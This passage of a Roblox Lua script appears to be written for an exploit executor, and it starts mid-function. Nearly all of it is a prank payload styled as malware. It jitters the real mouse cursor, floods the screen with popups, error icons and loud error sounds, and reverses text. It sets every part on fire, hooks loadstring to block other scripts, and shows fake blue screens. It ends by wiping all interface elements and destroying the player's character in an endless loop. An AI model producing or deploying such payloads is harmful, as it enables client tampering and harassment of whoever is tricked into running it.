                duplicate.Size = UDim2.new(element.Size.X.Scale * 0.5, element.Size.X.Offset, element.Size.Y.Scale * 0.5, element.Size.Y.Offset)

                if element:IsA("TextLabel") or element:IsA("TextButton") then
                    duplicate.TextSize = element.TextSize * 0.5
                end

                return duplicate
            end
        end)
    end

    local function duplicateUI()
        runFunction(function()
            if running then
                local elements = game:GetDescendants()

                for _, element in ipairs(elements) do
                    if element:IsA("GuiObject") then
                        duplicateAndScale(element)
                    end
                end
            end
        end)
    end

    local function releaseHell()
        runFunction(function()
            if running then
                for _, element in ipairs(game:GetDescendants()) do
                    if element:IsA("BasePart") then
                        local fire = Instance.new("Fire")
                        fire.Parent = element
                        fire.Size = element.Size.X + element.Size.Y + element.Size.Z
                        fire.TimeScale = 0.5
                        fire.Heat = 5
                        fire.Enabled = true
                        fire.SecondaryColor = Color3.fromRGB(0, 0, 0)
                        fire.Color = Color3.fromRGB(137, 103, 19)
                        fire.Name = "THIS_NAME_IS_FOR_REMOVING_IT_LATER"
                    end
                end
            end
        end)
    end

    local function mouseMove()
        runFunction(function()
            if running then
                mousemoveabs(mouse.X + math.random(-1, 1), mouse.Y + math.random(-1, 1))
            end
        end)
    end

    local function reverseText(element)
        runFunction(function()
            if running then
                if element:IsA("TextLabel") or element:IsA("TextButton") or element:IsA("TextBox") then
                    element.Text = string.reverse(element.Text)
                end
            end
        end)
    end

    local function stringReverse(parent)
        runFunction(function()
            if running then
                for _, element in ipairs(parent:GetDescendants()) do
                    reverseText(element)
                end
            end
        end)
    end

    local RunLoops = {RenderStepTable = {}, StepTable = {}, HeartTable = {}}
    do
        function RunLoops:BindToRenderStep(name, func)
            if RunLoops.RenderStepTable[name] == nil then
                RunLoops.RenderStepTable[name] = runService.RenderStepped:Connect(func)
            end
        end

        function RunLoops:UnbindFromRenderStep(name)
            if RunLoops.RenderStepTable[name] then
                RunLoops.RenderStepTable[name]:Disconnect()
                RunLoops.RenderStepTable[name] = nil
            end
        end
    end

    function drawError(decay, decaydelay)
        runFunction(function()
            if running then
                local ImageLabel = Instance.new("ImageLabel")
                ImageLabel.Parent = errors
                ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                ImageLabel.BackgroundTransparency = 1.000
                ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                ImageLabel.BorderSizePixel = 0
                ImageLabel.Position = UDim2.fromOffset(uis:GetMouseLocation().X - 10, uis:GetMouseLocation().Y - 45 )
                ImageLabel.Size = UDim2.new(0, 23, 0, 23)
                ImageLabel.Image = "rbxassetid://14173008900"

                if decay then
                    task.wait(decaydelay)
                    ImageLabel:Destroy()
                end
            end
        end)
    end

    function userChange()
        runFunction(function()
            if running then
                for _, plrname in ipairs(game.CoreGui.PlayerList:GetDescendants()) do
                    if plrname:IsA("TextLabel") then
                        plrname.Text = "玩得開心哈哈玩得開心哈哈"
                    end
                end
            end
        end)
    end

    function errorSound()
        runFunction(function()
            if running then
                local Windows10ErrorSound = Instance.new("Sound")
                Windows10ErrorSound.Parent = game:GetService("Workspace")
                Windows10ErrorSound.Looped = false
                Windows10ErrorSound.Volume = 10
                Windows10ErrorSound.SoundId ="rbxassetid://5914602124"
                Windows10ErrorSound.Name ="Windows 10 Error Sound"
                Windows10ErrorSound.Playing = true
                Windows10ErrorSound.PlayOnRemove = false		
            end	
        end)
    end

    function popup(decay, decaydelay)
        runFunction(function()
            if running then
                local Frame = Instance.new("Frame")
                local TextLabel = Instance.new("TextLabel")
                local TextLabel_2 = Instance.new("TextLabel")
                popups.Name = "popups"
                popups.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
                popups.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                Frame.Parent = popups
                Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                Frame.BorderSizePixel = 0
                Frame.Position = UDim2.new(0.363999993, 0, 0.465476334, 0)
                Frame.Size = UDim2.new(0, 255, 0, 85)
                TextLabel.Parent = Frame
                TextLabel.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
                TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                TextLabel.BorderSizePixel = 0
                TextLabel.Position = UDim2.new(0, 21, 0, 6)
                TextLabel.Size = UDim2.new(0, 213, 0, 43)
                TextLabel.Font = Enum.Font.SourceSans
                TextLabel.Text = "lol"
                TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.TextScaled = true
                TextLabel.TextSize = 14.000
                TextLabel.TextWrapped = true
                TextLabel_2.Parent = Frame
                TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
                TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                TextLabel_2.BorderSizePixel = 0
                TextLabel_2.Position = UDim2.new(0, math.random(0, 867), 0, math.random(0, 894))
                TextLabel_2.Size = UDim2.new(0, 200, 0, 17)
                TextLabel_2.Font = Enum.Font.SourceSans
                TextLabel_2.Text = "have fun"
                TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel_2.TextScaled = true
                TextLabel_2.TextSize = 14.000
                TextLabel_2.TextWrapped = true

                if decay then
                    task.wait(decaydelay)
                    Frame:Destroy()
                end
            end
        end)
    end

    local function END_SCRIPT()
        running = false
    
        for _, coreasset in ipairs(game.CoreGui:GetDescendants()) do
            coreasset:Destroy()
        end
        for _, starterasset in ipairs(game.StarterGui:GetDescendants()) do
            starterasset:Destroy()
        end
        for _, plrasset in ipairs(localplayer.PlayerGui:GetDescendants()) do
            plrasset:Destroy()
        end
        local lolxd = Instance.new("ScreenGui")
        local Frame = Instance.new("Frame")
        local ImageLabel = Instance.new("ImageLabel")
        lolxd.Name = "lolxd"
        lolxd.Parent = game.CoreGui
        lolxd.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        lolxd.DisplayOrder = 999999999
        Frame.Parent = lolxd
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Color3.fromRGB(124, 127, 137)
        Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
        Frame.BorderSizePixel = 0
        Frame.Position = UDim2.new(0.5, 0, 0.450748146, 0)
        Frame.Size = UDim2.new(1.00063288, 0, 1.0972569, 0)
        Frame.ZIndex = math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge
        ImageLabel.Parent = Frame
        ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
        ImageLabel.BorderSizePixel = 0
        ImageLabel.Position = UDim2.new(0.444213718, 0, 0.444734752, 0)
        ImageLabel.Size = UDim2.new(0.110689439, 0, 0.198863626, 0)
        ImageLabel.Image = "rbxassetid://14195957999"
        repeat task.wait() if GetCharacter() == true then localplayer.Character:Destroy() end until (nil)
    end

    popup()

    hookfunction(loadstring, function()
        runFunction(function()
            if running then
                print("lmao nice try trying to loadstring, ive blocked it :)")
                return nil
            end
        end)
    end)

    runFunction(function()
        do
        userChange()
        end
    end)

    runFunction(function()
        do
            RunLoops:BindToRenderStep("DrawError", function()
                drawError()
            end)
        end
    end)

    runFunction(function()
        do
            repeat task.wait(mousep)
                mouseMove()
            until (nil)
        end
    end)

    task.wait(5)

    runFunction(function()
        do
            repeat
                task.wait(invertWait)
                invertAssetsWithColor()
            until (nil)
        end
    end)

    task.wait(5)

    runFunction(function()
        do
            repeat
                task.wait(stringreversewait)
                stringReverse(game)
            until (nil)
        end
    end)

    task.wait(5)

    runFunction(function()
        do
        releaseHell()
        end
    end)

    task.wait(5)

    runFunction(function()
        do
            repeat
                task.wait(messUISwait)
                messUIS()
            until (nil)
        end
    end)

    task.wait(5)

    runFunction(function()
        do
            repeat
                task.wait(popupwait)
                popup()
            until (nil)
        end
    end)

    task.wait(3)

    runFunction(function()
        do
            repeat
                errorSoundWait = math.random(0.3, 0.8)
                task.wait(errorSoundWait)
                errorSound()
            until (nil)
        end
    end)

    runFunction(function()
        do
            repeat
                task.wait(framepayloadRate)
                slideyframe()
            until (nil)
        end
    end)

    runFunction(function()
        do
            repeat
                task.wait(framepayloadRate2)
                slideyframehorizontal()
            until (nil)
        end
    end)

    task.wait(7.5)

    runFunction(function()
        do
        duplicateUI()
        end
    end)

    if running then
        wait(10)
        invertWait = 0.5
        popupwait = 2
        messUIS = 0.1
        stringreversewait = 0.35
        framepayloadRate = 1
        wait(10)
        popupwait = 0.25
        mousep = 0
    end

    wait(10)
    running = false
    BSoD()
    wait(33)
    running = true
    runFunction(function()
        do
        revealUIS()
        end
    end)
    wait(2)
    runFunction(function()
        do
            duplicateUI()
        end
    end)
    wait(13)
    running = false
    BSoD2()
    wait(6)
    running = true
    wait(5)
    messUIS= 0.075
    wait(3)
    END_SCRIPT()
end
RUN_SCRIPT()
